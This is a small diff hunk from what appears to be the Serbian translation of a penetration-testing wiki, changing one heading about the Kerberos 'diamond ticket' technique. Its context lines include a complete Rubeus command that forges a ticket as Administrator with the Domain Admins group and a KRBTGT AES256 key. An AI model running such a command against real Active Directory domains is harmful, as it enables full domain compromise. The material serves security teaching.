@@ -39,7 +39,7 @@ Za više informacija o zlatnim karticama proverite:
 golden-ticket.md
 {{#endref}}
 
-### Dijamantska kartica (Rubeus + KRBTGT-AES256)
+### Dijamantska karta (Rubeus + KRBTGT-AES256)
 ```powershell
 # Use the /sids param
 Rubeus.exe diamond /tgtdeleg /ticketuser:Administrator /ticketuserid:500 /groups:512 /sids:S-1-5-21-378720957-2217973887-3501892633-512 /krbkey:390b2fdb13cc820d73ecf2dadddd4c9d76425d4c2156b89ac551efb9d591a8aa /nowrap
